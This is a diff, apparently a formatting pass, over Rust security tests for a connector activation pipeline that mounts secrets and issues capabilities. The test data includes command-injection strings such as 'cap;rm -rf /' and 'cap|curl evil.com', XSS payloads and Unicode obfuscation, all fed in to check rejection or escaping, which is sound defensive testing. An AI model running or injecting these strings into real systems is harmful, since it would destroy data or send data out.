@@ -1373,11 +1373,11 @@ mod tests {
     #[test]
     fn negative_unicode_connector_ids_handled_gracefully() {
         let unicode_ids = vec![
-            "连接器-🔥-测试",                    // Mixed CJK with emoji
+            "连接器-🔥-测试",                  // Mixed CJK with emoji
             "موصل-اختبار-٧٨٩",                 // Arabic with numbers
             "connector\u{200B}hidden\u{FEFF}", // Zero-width space and BOM
-            "connect‌or‍invisible",             // Zero-width joiners
-            "𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒐𝒓",               // Mathematical script unicode
+            "connect‌or‍invisible",              // Zero-width joiners
+            "𝒄𝒐𝒏𝒏𝒆𝒄𝒕𝒐𝒓",                       // Mathematical script unicode
             "connect\u{0301}or\u{0302}",       // Combining diacriticals
             "conn\u{202E}rtl\u{202D}ector",    // RTL/LTR override
             "connector\u{1F600}test",          // Emoji codepoint
@@ -1429,7 +1429,10 @@ mod tests {
         let transcript = activate(&input, &DefaultExecutor);
 
         // Should handle large secret lists without memory corruption
-        assert!(transcript.completed, "Should handle large secret lists successfully");
+        assert!(
+            transcript.completed,
+            "Should handle large secret lists successfully"
+        );
         assert_eq!(transcript.stages.len(), 4);
         assert!(transcript.stages.iter().all(|s| s.success));
 
@@ -1443,7 +1446,7 @@ mod tests {
             ("connector\0null", "Null byte in connector ID"),
             ("connector\x01\x02", "Control characters in connector ID"),
             ("connector\r\nline", "Line break in connector ID"),
-            ("connector\x7F\x80", "DEL and high bytes"),
+            ("connector\u{7f}\u{80}", "DEL and high bytes"),
             ("connector\u{FFFE}", "Unicode non-character"),
         ];
 
@@ -1456,10 +1459,7 @@ mod tests {
                     format!("secret\x01control"),
                     format!("secret\r\nbreak"),
                 ],
-                capabilities: vec![
-                    format!("cap\0null"),
-                    format!("cap\x7Fhigh"),
-                ],
+                capabilities: vec![format!("cap\0null"), format!("cap\x7Fhigh")],
                 trace_id: format!("trace\0test"),
                 timestamp: format!("2026\0test"),
             };
@@ -1489,7 +1489,10 @@ mod tests {
             (r#"{"mode":}"#, "Missing value"),
             (r#"{"mode":"test""#, "Unclosed quotes"),
             (r#"{"mode":"test","}"#, "Malformed key"),
-            ("{\"mode\":\"test\",\"extra\":{{{{}", "Deeply nested malformed"),
+            (
+                "{\"mode\":\"test\",\"extra\":{{{{}",
+                "Deeply nested malformed",
+            ),
             ("not json at all", "Not JSON"),
             (r#"{"mode":null}"#, "Null value"),
         ];
@@ -1507,13 +1510,20 @@ mod tests {
             let transcript = activate(&input, &DefaultExecutor);
 
             // Should fail at sandbox creation stage for malformed JSON
-            assert!(!transcript.completed, "Should fail for malformed config: {}", description);
+            assert!(
+                !transcript.completed,
+                "Should fail for malformed config: {}",
+                description
+            );
             assert!(!transcript.stages.is_empty());
 
             // First stage should be SandboxCreate and should fail
             assert_eq!(transcript.stages[0].stage, ActivationStage::SandboxCreate);
             assert!(!transcript.stages[0].success);
-            assert_eq!(transcript.stages[0].error.as_ref().unwrap().code(), "ACT_SANDBOX_FAILED");
+            assert_eq!(
+                transcript.stages[0].error.as_ref().unwrap().code(),
+                "ACT_SANDBOX_FAILED"
+            );
 
             // Should not proceed to other stages
             assert_eq!(transcript.stages.len(), 1);
@@ -1548,16 +1558,28 @@ mod tests {
             let transcript = activate(&input, &DefaultExecutor);
 
             // Should fail at SecretMount stage due to path validation
-            assert!(!transcript.completed, "Should reject path traversal: {}", malicious_path);
+            assert!(
+                !transcript.completed,
+                "Should reject path traversal: {}",
+                malicious_path
+            );
             assert_eq!(transcript.stages.len(), 2);
             assert!(transcript.stages[0].success); // SandboxCreate should pass
             assert!(!transcript.stages[1].success); // SecretMount should fail
-            assert_eq!(transcript.stages[1].error.as_ref().unwrap().code(), "ACT_SECRET_MOUNT_FAILED");
+            assert_eq!(
+                transcript.stages[1].error.as_ref().unwrap().code(),
+                "ACT_SECRET_MOUNT_FAILED"
+            );
 
             // Error message should indicate path safety issue
             let error_msg = transcript.stages[1].error.as_ref().unwrap().to_string();
-            assert!(error_msg.contains("path") || error_msg.contains("null") || error_msg.contains("empty"),
-                   "Should contain path safety error for: {}", malicious_path);
+            assert!(
+                error_msg.contains("path")
+                    || error_msg.contains("null")
+                    || error_msg.contains("empty"),
+                "Should contain path safety error for: {}",
+                malicious_path
+            );
         }
     }
 
@@ -1569,7 +1591,9 @@ mod tests {
         for cycle in 0..100 {
             // Mount several secrets
             for i in 0..10 {
-                tracker.mount(&format!("cycle-{}-secret-{}", cycle, i)).expect("Mount should succeed");
+                tracker
+                    .mount(&format!("cycle-{}-secret-{}", cycle, i))
+                    .expect("Mount should succeed");
             }
 
             // Check state consistency
@@ -1597,16 +1621,16 @@ mod tests {
     #[test]
     fn negative_capability_name_injection_attempts() {
         let malicious_capabilities = vec![
-            "",                             // Empty capability
-            "cap\0injection",              // Null byte
-            "cap;rm -rf /",               // Command injection attempt
-            "cap$(whoami)",               // Command substitution
-            "cap`id`",                    // Backtick injection
-            "cap|curl evil.com",          // Pipe injection
-            "cap&sleep 10",               // Background command
-            "cap'drop table users",       // SQL injection attempt
-            "cap\r\nexec evil",           // Command separator
-            "cap\u{202E}evil",            // RTL override obfuscation
+            "",                     // Empty capability
+            "cap\0injection",       // Null byte
+            "cap;rm -rf /",         // Command injection attempt
+            "cap$(whoami)",         // Command substitution
+            "cap`id`",              // Backtick injection
+            "cap|curl evil.com",    // Pipe injection
+            "cap&sleep 10",         // Background command
+            "cap'drop table users", // SQL injection attempt
+            "cap\r\nexec evil",     // Command separator
+            "cap\u{202E}evil",      // RTL override obfuscation
         ];
 
         for malicious_cap in malicious_capabilities {
@@ -1626,7 +1650,10 @@ mod tests {
                 assert!(!transcript.completed);
                 assert_eq!(transcript.stages.len(), 3);
                 assert!(!transcript.stages[2].success); // CapabilityIssue should fail
-                assert_eq!(transcript.stages[2].error.as_ref().unwrap().code(), "ACT_CAPABILITY_FAILED");
+                assert_eq!(
+                    transcript.stages[2].error.as_ref().unwrap().code(),
+                    "ACT_CAPABILITY_FAILED"
+                );
             } else {
                 // Non-empty malicious capabilities should be handled without injection
                 // The DefaultExecutor should accept them as-is for testing
@@ -1644,7 +1671,9 @@ mod tests {
 
         // Test saturating arithmetic in count tracking
         for i in 0..MAX_MOUNTED_SECRETS {
-            tracker.mount(&format!("counting-secret-{}", i)).expect("Should mount successfully");
+            tracker
+                .mount(&format!("counting-secret-{}", i))
+                .expect("Should mount successfully");
         }
 
         // Verify we're at the limit
@@ -1659,7 +1688,7 @@ mod tests {
 
         // Test that large collection validation uses saturating arithmetic
         let requested = vec!["secret".to_string(); 1]; // Small valid set
-        let mounted = vec!["secret".to_string(); 1];   // Matching set
+        let mounted = vec!["secret".to_string(); 1]; // Matching set
 
         // This should succeed despite extreme theoretical counts
         let validation_result = validate_mounted_secret_set(&requested, &mounted);
@@ -1687,20 +1716,20 @@ mod tests {
         // Unicode injection attempts in various activation input fields
         let malicious_inputs = vec![
             ActivationInput {
-                connector_id: "\u{202E}safe-connector\u{202D}malicious".to_string(),  // BiDi override
+                connector_id: "\u{202E}safe-connector\u{202D}malicious".to_string(), // BiDi override
                 sandbox_config: r#"{"mode":"default"}"#.to_string(),
-                secret_refs: vec!["secret\u{200B}admin".to_string()],  // Zero-width space
-                capabilities: vec!["cap\u{FEFF}root".to_string()],  // Zero-width no-break space
-                trace_id: "\u{0000}bypass".to_string(),  // Null injection
+                secret_refs: vec!["secret\u{200B}admin".to_string()], // Zero-width space
+                capabilities: vec!["cap\u{FEFF}root".to_string()],    // Zero-width no-break space
+                trace_id: "\u{0000}bypass".to_string(),               // Null injection
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
             ActivationInput {
                 connector_id: "normal_connector".to_string(),
-                sandbox_config: r#"{"mode":"default","injection":"\u{2028}newline"}"#.to_string(),  // Line separator in JSON
-                secret_refs: vec!["secret\u{2029}one".to_string()],  // Paragraph separator
-                capabilities: vec!["read\u{200E}admin\u{200F}".to_string()],  // LTR/RTL marks
-                trace_id: "trace\u{202C}reset".to_string(),  // Pop directional formatting
-                timestamp: "2026-01-01T00:00:00Z\u{0000}".to_string(),  // Null in timestamp
+                sandbox_config: r#"{"mode":"default","injection":"\u{2028}newline"}"#.to_string(), // Line separator in JSON
+                secret_refs: vec!["secret\u{2029}one".to_string()], // Paragraph separator
+                capabilities: vec!["read\u{200E}admin\u{200F}".to_string()], // LTR/RTL marks
+                trace_id: "trace\u{202C}reset".to_string(),         // Pop directional formatting
+                timestamp: "2026-01-01T00:00:00Z\u{0000}".to_string(), // Null in timestamp
             },
         ];
 
@@ -1713,29 +1742,42 @@ mod tests {
                     let transcript = activate(&malicious_input, &DefaultExecutor);
 
                     // Unicode should not create privileged identifiers
-                    assert!(!ct_eq(transcript.input.connector_id.as_bytes(), b"admin"),
-                           "Unicode injection should not create admin connector");
+                    assert!(
+                        !ct_eq(transcript.input.connector_id.as_bytes(), b"admin"),
+                        "Unicode injection should not create admin connector"
+                    );
 
                     // Check secret refs and capabilities don't contain dangerous content
                     for secret_ref in &transcript.input.secret_refs {
-                        assert!(!ct_eq(secret_ref.as_bytes(), b"admin"),
-                               "Unicode injection should not create admin secrets");
-                        assert!(!secret_ref.contains('\0'),
-                               "Secret refs should not contain null bytes");
+                        assert!(
+                            !ct_eq(secret_ref.as_bytes(), b"admin"),
+                            "Unicode injection should not create admin secrets"
+                        );
+                        assert!(
+                            !secret_ref.contains('\0'),
+                            "Secret refs should not contain null bytes"
+                        );
                     }
 
                     for capability in &transcript.input.capabilities {
-                        assert!(!ct_eq(capability.as_bytes(), b"root"),
-                               "Unicode injection should not create root capabilities");
-                        assert!(!capability.contains('\0'),
-                               "Capabilities should not contain null bytes");
+                        assert!(
+                            !ct_eq(capability.as_bytes(), b"root"),
+                            "Unicode injection should not create root capabilities"
+                        );
+                        assert!(
+                            !capability.contains('\0'),
+                            "Capabilities should not contain null bytes"
+                        );
                     }
 
                     // Activation should still be deterministic
                     let second_transcript = activate(&malicious_input, &DefaultExecutor);
-                    assert_eq!(transcript.stages.len(), second_transcript.stages.len(),
-                             "Unicode content should not affect activation determinism");
-                },
+                    assert_eq!(
+                        transcript.stages.len(),
+                        second_transcript.stages.len(),
+                        "Unicode content should not affect activation determinism"
+                    );
+                }
                 Err(_) => {
                     // Graceful rejection of malformed Unicode inputs is acceptable
                 }
@@ -1750,25 +1792,28 @@ mod tests {
             ActivationInput {
                 connector_id: "memory_test_capabilities".to_string(),
                 sandbox_config: r#"{"mode":"default"}"#.to_string(),
-                secret_refs: vec!["secret1".to_string(), "secret2".to_string()],  // Normal secrets
-                capabilities: (0..100_000).map(|i| format!("capability_{}", i)).collect(),  // 100K capabilities
+                secret_refs: vec!["secret1".to_string(), "secret2".to_string()], // Normal secrets
+                capabilities: (0..100_000).map(|i| format!("capability_{}", i)).collect(), // 100K capabilities
                 trace_id: "trace_cap_exhaustion".to_string(),
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
             ActivationInput {
                 connector_id: "memory_test_secrets".to_string(),
                 sandbox_config: r#"{"mode":"default"}"#.to_string(),
-                secret_refs: (0..50_000).map(|i| format!("secret_{}", i)).collect(),  // 50K secrets
-                capabilities: vec!["cap_read".to_string(), "cap_write".to_string()],  // Normal capabilities
+                secret_refs: (0..50_000).map(|i| format!("secret_{}", i)).collect(), // 50K secrets
+                capabilities: vec!["cap_read".to_string(), "cap_write".to_string()], // Normal capabilities
                 trace_id: "trace_secret_exhaustion".to_string(),
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
             ActivationInput {
                 connector_id: "memory_test_large_strings".to_string(),
-                sandbox_config: format!(r#"{{"mode":"default","large_field":"{}"}}"#, "x".repeat(1_000_000)),  // 1MB JSON field
-                secret_refs: vec!["a".repeat(100_000)],  // 100KB secret ref
-                capabilities: vec!["b".repeat(100_000)],  // 100KB capability
-                trace_id: "c".repeat(100_000),  // 100KB trace ID
+                sandbox_config: format!(
+                    r#"{{"mode":"default","large_field":"{}"}}"#,
+                    "x".repeat(1_000_000)
+                ), // 1MB JSON field
+                secret_refs: vec!["a".repeat(100_000)], // 100KB secret ref
+                capabilities: vec!["b".repeat(100_000)], // 100KB capability
+                trace_id: "c".repeat(100_000),          // 100KB trace ID
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
         ];
@@ -1779,33 +1824,42 @@ mod tests {
             match validation_result {
                 Ok(_) => {
                     // If validation passed, test activation under memory pressure
-                    let activation_result = std::panic::catch_unwind(|| {
-                        activate(&exhaustion_input, &DefaultExecutor)
-                    });
+                    let activation_result =
+                        std::panic::catch_unwind(|| activate(&exhaustion_input, &DefaultExecutor));
 
                     match activation_result {
                         Ok(transcript) => {
                             // If activation succeeded, verify resource limits were respected
-                            assert!(transcript.input.capabilities.len() <= MAX_CAPABILITIES,
-                                   "Capability count should be within limits");
-                            assert!(transcript.input.secret_refs.len() <= MAX_MOUNTED_SECRETS,
-                                   "Secret count should be within limits");
+                            assert!(
+                                transcript.input.capabilities.len() <= MAX_CAPABILITIES,
+                                "Capability count should be within limits"
+                            );
+                            assert!(
+                                transcript.input.secret_refs.len() <= MAX_MOUNTED_SECRETS,
+                                "Secret count should be within limits"
+                            );
 
                             // Verify transcript integrity
                             assert!(!transcript.stages.is_empty(), "Should have stages");
-                            assert!(verify_stage_order(&transcript), "Stage order should be preserved");
-                        },
+                            assert!(
+                                verify_stage_order(&transcript),
+                                "Stage order should be preserved"
+                            );
+                        }
                         Err(_) => {
                             // Graceful panic handling for extreme memory pressure is acceptable
                         }
                     }
-                },
+                }
                 Err(err) => {
                     // Expected rejection due to resource limits
-                    assert!(err.contains("too large") ||
-                           err.contains("limit") ||
-                           err.contains("exceeded"),
-                           "Error should indicate resource limits: {}", err);
+                    assert!(
+                        err.contains("too large")
+                            || err.contains("limit")
+                            || err.contains("exceeded"),
+                        "Error should indicate resource limits: {}",
+                        err
+                    );
                 }
             }
         }
@@ -1829,22 +1883,30 @@ mod tests {
 
         impl StageExecutor for OrderManipulationExecutor {
             fn create_sandbox(&self, _config: &str) -> Result<(), String> {
-                self.executed_stages.borrow_mut().push(ActivationStage::SandboxCreate);
+                self.executed_stages
+                    .borrow_mut()
+                    .push(ActivationStage::SandboxCreate);
                 Ok(())
             }
 
             fn mount_secrets(&self, secret_refs: &[String]) -> Result<Vec<String>, String> {
-                self.executed_stages.borrow_mut().push(ActivationStage::SecretMount);
+                self.executed_stages
+                    .borrow_mut()
+                    .push(ActivationStage::SecretMount);
                 Ok(secret_refs.to_vec())
             }
 
             fn issue_capabilities(&self, _capabilities: &[String]) -> Result<(), String> {
-                self.executed_stages.borrow_mut().push(ActivationStage::CapabilityIssue);
+                self.executed_stages
+                    .borrow_mut()
+                    .push(ActivationStage::CapabilityIssue);
                 Ok(())
             }
 
             fn health_check(&self) -> Result<(), String> {
-                self.executed_stages.borrow_mut().push(ActivationStage::HealthReady);
+                self.executed_stages
+                    .borrow_mut()
+                    .push(ActivationStage::HealthReady);
                 Ok(())
             }
         }
@@ -1853,20 +1915,29 @@ mod tests {
         let transcript = activate(&test_input(), &executor);
 
         // Verify that despite any internal manipulation attempts, the transcript maintains correct order
-        assert!(verify_stage_order(&transcript), "Stage order should be enforced");
+        assert!(
+            verify_stage_order(&transcript),
+            "Stage order should be enforced"
+        );
         assert_eq!(transcript.stages.len(), 4, "Should have all four stages");
 
         // Verify canonical sequence was followed
         for (i, stage_result) in transcript.stages.iter().enumerate() {
             let expected_stage = ActivationStage::sequence()[i];
-            assert_eq!(stage_result.stage, expected_stage,
-                     "Stage {} should be {:?}, got {:?}", i, expected_stage, stage_result.stage);
+            assert_eq!(
+                stage_result.stage, expected_stage,
+                "Stage {} should be {:?}, got {:?}",
+                i, expected_stage, stage_result.stage
+            );
         }
 
         // Verify executor was called in correct order
         let executed_stages = executor.executed_stages.borrow();
-        assert_eq!(*executed_stages, ActivationStage::sequence().to_vec(),
-                 "Executor stages should match canonical sequence");
+        assert_eq!(
+            *executed_stages,
+            ActivationStage::sequence().to_vec(),
+            "Executor stages should match canonical sequence"
+        );
     }
 
     #[test]
@@ -1874,27 +1945,27 @@ mod tests {
         // Inputs designed to bypass validation
         let bypass_inputs = vec![
             ActivationInput {
-                connector_id: "".to_string(),  // Empty connector ID
-                sandbox_config: "".to_string(),  // Empty config
-                secret_refs: vec![],  // Empty secrets
-                capabilities: vec![],  // Empty capabilities
-                trace_id: "".to_string(),  // Empty trace ID
-                timestamp: "".to_string(),  // Empty timestamp
+                connector_id: "".to_string(),   // Empty connector ID
+                sandbox_config: "".to_string(), // Empty config
+                secret_refs: vec![],            // Empty secrets
+                capabilities: vec![],           // Empty capabilities
+                trace_id: "".to_string(),       // Empty trace ID
+                timestamp: "".to_string(),      // Empty timestamp
             },
             ActivationInput {
-                connector_id: "\0".to_string(),  // Null byte
-                sandbox_config: "{".to_string(),  // Invalid JSON
-                secret_refs: vec!["\0".to_string()],  // Null in secret
-                capabilities: vec!["\0".to_string()],  // Null in capability
-                trace_id: "\0".to_string(),  // Null in trace
-                timestamp: "invalid-timestamp".to_string(),  // Invalid timestamp format
+                connector_id: "\0".to_string(),             // Null byte
+                sandbox_config: "{".to_string(),            // Invalid JSON
+                secret_refs: vec!["\0".to_string()],        // Null in secret
+                capabilities: vec!["\0".to_string()],       // Null in capability
+                trace_id: "\0".to_string(),                 // Null in trace
+                timestamp: "invalid-timestamp".to_string(), // Invalid timestamp format
             },
             ActivationInput {
-                connector_id: "a".repeat(MAX_INPUT_STRING_LENGTH + 1),  // Exceed length limit
+                connector_id: "a".repeat(MAX_INPUT_STRING_LENGTH + 1), // Exceed length limit
                 sandbox_config: r#"{"mode":"default"}"#.to_string(),
-                secret_refs: vec!["b".repeat(MAX_INPUT_STRING_LENGTH + 1)],  // Exceed secret length
-                capabilities: vec!["c".repeat(MAX_INPUT_STRING_LENGTH + 1)],  // Exceed capability length
-                trace_id: "d".repeat(MAX_INPUT_STRING_LENGTH + 1),  // Exceed trace length
+                secret_refs: vec!["b".repeat(MAX_INPUT_STRING_LENGTH + 1)], // Exceed secret length
+                capabilities: vec!["c".repeat(MAX_INPUT_STRING_LENGTH + 1)], // Exceed capability length
+                trace_id: "d".repeat(MAX_INPUT_STRING_LENGTH + 1),           // Exceed trace length
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
         ];
@@ -1909,8 +1980,10 @@ mod tests {
 
                     // Empty inputs should not cause crashes
                     if bypass_input.connector_id.is_empty() {
-                        assert!(!transcript.completed || transcript.stages.iter().all(|s| s.success),
-                               "Empty connector ID should either fail validation or complete safely");
+                        assert!(
+                            !transcript.completed || transcript.stages.iter().all(|s| s.success),
+                            "Empty connector ID should either fail validation or complete safely"
+                        );
                     }
 
                     // Null bytes should not appear in transcript
@@ -1922,14 +1995,17 @@ mod tests {
                     for capability in &transcript.input.capabilities {
                         assert!(!capability.contains('\0'));
                     }
-                },
+                }
                 Err(err) => {
                     // Expected rejection of invalid inputs
-                    assert!(err.contains("invalid") ||
-                           err.contains("empty") ||
-                           err.contains("too large") ||
-                           err.contains("limit"),
-                           "Error should indicate validation failure: {}", err);
+                    assert!(
+                        err.contains("invalid")
+                            || err.contains("empty")
+                            || err.contains("too large")
+                            || err.contains("limit"),
+                        "Error should indicate validation failure: {}",
+                        err
+                    );
                 }
             }
         }
@@ -1943,8 +2019,12 @@ mod tests {
             ActivationInput {
                 connector_id: "at_limits".to_string(),
                 sandbox_config: r#"{"mode":"default"}"#.to_string(),
-                secret_refs: (0..MAX_MOUNTED_SECRETS).map(|i| format!("secret_{}", i)).collect(),
-                capabilities: (0..MAX_CAPABILITIES).map(|i| format!("cap_{}", i)).collect(),
+                secret_refs: (0..MAX_MOUNTED_SECRETS)
+                    .map(|i| format!("secret_{}", i))
+                    .collect(),
+                capabilities: (0..MAX_CAPABILITIES)
+                    .map(|i| format!("cap_{}", i))
+                    .collect(),
                 trace_id: "trace_at_limits".to_string(),
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
@@ -1952,8 +2032,12 @@ mod tests {
             ActivationInput {
                 connector_id: "over_limits".to_string(),
                 sandbox_config: r#"{"mode":"default"}"#.to_string(),
-                secret_refs: (0..MAX_MOUNTED_SECRETS + 1).map(|i| format!("secret_{}", i)).collect(),
-                capabilities: (0..MAX_CAPABILITIES + 1).map(|i| format!("cap_{}", i)).collect(),
+                secret_refs: (0..MAX_MOUNTED_SECRETS + 1)
+                    .map(|i| format!("secret_{}", i))
+                    .collect(),
+                capabilities: (0..MAX_CAPABILITIES + 1)
+                    .map(|i| format!("cap_{}", i))
+                    .collect(),
                 trace_id: "trace_over_limits".to_string(),
                 timestamp: "2026-01-01T00:00:00Z".to_string(),
             },
@@ -1961,17 +2045,22 @@ mod tests {
 
         for limit_input in limit_test_inputs {
             let validation_result = validate_activation_input(&limit_input);
-            let is_over_limit = limit_input.secret_refs.len() > MAX_MOUNTED_SECRETS ||
-                              limit_input.capabilities.len() > MAX_CAPABILITIES;
+            let is_over_limit = limit_input.secret_refs.len() > MAX_MOUNTED_SECRETS
+                || limit_input.capabilities.len() > MAX_CAPABILITIES;
 
             if is_over_limit {
                 // Should reject inputs that exceed limits
-                assert!(validation_result.is_err(),
-                       "Should reject inputs exceeding resource limits");
+                assert!(
+                    validation_result.is_err(),
+                    "Should reject inputs exceeding resource limits"
+                );
 
                 if let Err(err) = validation_result {
-                    assert!(err.contains("limit") || err.contains("too many"),
-                           "Error should indicate limit violation: {}", err);
+                    assert!(
+                        err.contains("limit") || err.contains("too many"),
+                        "Error should indicate limit violation: {}",
+                        err
+                    );
                 }
             } else {
                 // At-limit inputs might be accepted
@@ -1983,7 +2072,7 @@ mod tests {
                         // Should not exceed documented limits
                         assert!(transcript.input.secret_refs.len() <= MAX_MOUNTED_SECRETS);
                         assert!(transcript.input.capabilities.len() <= MAX_CAPABILITIES);
-                    },
+                    }
                     Err(_) => {
                         // Rejection at the limit is also acceptable for safety
                     }
@@ -2033,7 +2122,11 @@ mod tests {
         let cleanup_test_input = ActivationInput {
             connector_id: "cleanup_test".to_string(),
             sandbox_config: r#"{"mode":"secure"}"#.to_string(),
-            secret_refs: vec!["secret_1".to_string(), "secret_2".to_string(), "secret_3".to_string()],
+            secret_refs: vec![
+                "secret_1".to_string(),
+                "secret_2".to_string(),
+                "secret_3".to_string(),
+            ],
             capabilities: vec!["cap_read".to_string()],
             trace_id: "cleanup_trace".to_string(),
             timestamp: "2026-01-01T00:00:00Z".to_string(),
@@ -2045,12 +2138,23 @@ mod tests {
 
         // Activation should fail at capability stage
         assert!(!transcript.completed, "Activation should fail");
-        assert_eq!(transcript.stages.len(), 3, "Should have 3 stages (sandbox, secrets, capability failure)");
-        assert!(!transcript.stages[2].success, "Capability stage should fail");
+        assert_eq!(
+            transcript.stages.len(),
+            3,
+            "Should have 3 stages (sandbox, secrets, capability failure)"
+        );
+        assert!(
+            !transcript.stages[2].success,
+            "Capability stage should fail"
+        );
 
         // Verify secrets were mounted before failure
         let mounted_secrets = executor_normal.mounted_secrets.borrow();
-        assert_eq!(mounted_secrets.len(), 3, "Should have mounted all 3 secrets");
+        assert_eq!(
+            mounted_secrets.len(),
+            3,
+            "Should have mounted all 3 secrets"
+        );
         assert!(mounted_secrets.contains(&"secret_1".to_string()));
         assert!(mounted_secrets.contains(&"secret_2".to_string()));
         assert!(mounted_secrets.contains(&"secret_3".to_string()));
@@ -2063,7 +2167,9 @@ mod tests {
         assert!(!transcript_bypass.completed, "Activation should still fail");
 
         // Verify error information is preserved for audit
-        let capability_stage = transcript_bypass.stages.iter()
+        let capability_stage = transcript_bypass
+            .stages
+            .iter()
             .find(|s| s.stage == ActivationStage::CapabilityIssue)
             .expect("Should have capability stage");
 
@@ -2077,12 +2183,12 @@ mod tests {
     fn test_security_json_injection_in_sandbox_config_and_errors() {
         // Sandbox configs with injection attempts
         let injection_configs = vec![
-            r#"{"mode":"default","injection":"\"};alert('xss');//"}"#,  // JS injection
-            r#"{"mode":"default","html":"</script><script>alert('xss')</script>"}"#,  // HTML injection
-            r#"{"mode":"default","command":"$(rm -rf /)"}"#,  // Command injection
-            r#"{"mode":"default","newline":"line1\nline2\r\nline3"}"#,  // Newline injection
-            r#"{"mode":"default","unicode":"test\u0000null"}"#,  // Null injection
-            r#"{"mode":"default","quote":"test\"quote'mixed"}"#,  // Quote injection
+            r#"{"mode":"default","injection":"\"};alert('xss');//"}"#, // JS injection
+            r#"{"mode":"default","html":"</script><script>alert('xss')</script>"}"#, // HTML injection
+            r#"{"mode":"default","command":"$(rm -rf /)"}"#, // Command injection
+            r#"{"mode":"default","newline":"line1\nline2\r\nline3"}"#, // Newline injection
+            r#"{"mode":"default","unicode":"test\u0000null"}"#, // Null injection
+            r#"{"mode":"default","quote":"test\"quote'mixed"}"#, // Quote injection
         ];
 
         for injection_config in injection_configs {
@@ -2107,24 +2213,36 @@ mod tests {
                     match json_result {
                         Ok(json) => {
                             // JSON should escape all injection attempts
-                            assert!(!json.contains("alert('xss')"), "JavaScript injection should be escaped");
-                            assert!(!json.contains("</script>"), "HTML injection should be escaped");
-                            assert!(!json.contains("rm -rf"), "Command injection should be escaped");
+                            assert!(
+                                !json.contains("alert('xss')"),
+                                "JavaScript injection should be escaped"
+                            );
+                            assert!(
+                                !json.contains("</script>"),
+                                "HTML injection should be escaped"
+                            );
+                            assert!(
+                                !json.contains("rm -rf"),
+                                "Command injection should be escaped"
+                            );
                             assert!(!json.contains("\n"), "Newline injection should be escaped");
-                            assert!(!json.contains("\r"), "Carriage return injection should be escaped");
+                            assert!(
+                                !json.contains("\r"),
+                                "Carriage return injection should be escaped"
+                            );
                             assert!(!json.contains("\0"), "Null injection should be escaped");
 
                             // Verify roundtrip preserves structure
-                            let parsed: ActivationTranscript = serde_json::from_str(&json)
-                                .expect("should deserialize");
+                            let parsed: ActivationTranscript =
+                                serde_json::from_str(&json).expect("should deserialize");
                             assert_eq!(transcript.stages.len(), parsed.stages.len());
                             assert_eq!(transcript.completed, parsed.completed);
-                        },
+                        }
                         Err(_) => {
                             // Graceful serialization failure is acceptable for extreme injection
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Graceful rejection of malformed JSON is expected
                 }
@@ -2176,35 +2294,46 @@ mod tests {
         for (i, transcript) in transcripts.iter().enumerate() {
             assert!(transcript.completed, "Activation {} should complete", i);
             assert_eq!(transcript.stages.len(), 4, "Should have all 4 stages");
-            assert!(transcript.stages.iter().all(|s| s.success), "All stages should succeed");
+            assert!(
+                transcript.stages.iter().all(|s| s.success),
+                "All stages should succeed"
+            );
 
             // Verify stage order is preserved under concurrency
-            assert!(verify_stage_order(transcript), "Stage order should be preserved");
+            assert!(
+                verify_stage_order(transcript),
+                "Stage order should be preserved"
+            );
 
             // Verify input integrity
-            assert!(transcript.input.connector_id.contains(&i.to_string()),
-                   "Connector ID should be preserved");
+            assert!(
+                transcript.input.connector_id.contains(&i.to_string()),
+                "Connector ID should be preserved"
+            );
         }
 
         // Verify counter was incremented correctly
         let final_counter = activation_counter.lock().unwrap();
-        assert_eq!(*final_counter, 10, "All threads should have incremented counter");
+        assert_eq!(
+            *final_counter, 10,
+            "All threads should have incremented counter"
+        );
     }
 
     #[test]
     fn test_security_timestamp_manipulation() {
         // Timestamps with manipulation attempts
         let malicious_timestamps = vec![
-            "1970-01-01T00:00:00Z",  // Unix epoch
-            "2038-01-19T03:14:07Z",  // 32-bit timestamp overflow
-            "9999-12-31T23:59:59Z",  // Far future
-            "0001-01-01T00:00:00Z",  // Far past
-            "2026-01-01T00:00:00Z\0",  // Null termination
-            "2026-01-01T00:00:00Z\n",  // Newline injection
-            "2026\u{202E}-01-01T00:00:00Z\u{202D}",  // BiDi override
-            "$(date)",  // Command injection
-            "2026-13-40T25:70:70Z",  // Invalid date values
-            "",  // Empty timestamp
+            "1970-01-01T00:00:00Z",                 // Unix epoch
+            "2038-01-19T03:14:07Z",                 // 32-bit timestamp overflow
+            "9999-12-31T23:59:59Z",                 // Far future
+            "0001-01-01T00:00:00Z",                 // Far past
+            "2026-01-01T00:00:00Z\0",               // Null termination
+            "2026-01-01T00:00:00Z\n",               // Newline injection
+            "2026\u{202E}-01-01T00:00:00Z\u{202D}", // BiDi override
+            "$(date)",                              // Command injection
+            "2026-13-40T25:70:70Z",                 // Invalid date values
+            "",                                     // Empty timestamp
         ];
 
         for malicious_timestamp in malicious_timestamps {
@@ -2226,23 +2355,37 @@ mod tests {
 
                     // Verify timestamp doesn't affect activation logic
                     assert!(transcript.stages.len() > 0, "Should have stages");
-                    assert!(verify_stage_order(&transcript), "Stage order should be preserved");
+                    assert!(
+                        verify_stage_order(&transcript),
+                        "Stage order should be preserved"
+                    );
 
                     // Verify timestamp is preserved safely
-                    assert!(!transcript.input.timestamp.contains('\0'),
-                           "Timestamp should not contain null bytes");
+                    assert!(
+                        !transcript.input.timestamp.contains('\0'),
+                        "Timestamp should not contain null bytes"
+                    );
 
                     // Stage timestamps should be valid
                     for stage in &transcript.stages {
-                        assert!(!stage.timestamp.is_empty(), "Stage timestamp should not be empty");
-                        assert!(!stage.timestamp.contains('\0'), "Stage timestamp should not contain null");
+                        assert!(
+                            !stage.timestamp.is_empty(),
+                            "Stage timestamp should not be empty"
+                        );
+                        assert!(
+                            !stage.timestamp.contains('\0'),
+                            "Stage timestamp should not contain null"
+                        );
                     }
-                },
+                }
                 Err(err) => {
                     // Expected rejection for invalid timestamps
                     if malicious_timestamp.is_empty() || malicious_timestamp.contains("$(") {
-                        assert!(err.contains("invalid") || err.contains("timestamp"),
-                               "Error should indicate timestamp validation failure: {}", err);
+                        assert!(
+                            err.contains("invalid") || err.contains("timestamp"),
+                            "Error should indicate timestamp validation failure: {}",
+                            err
+                        );
                     }
                 }
             }
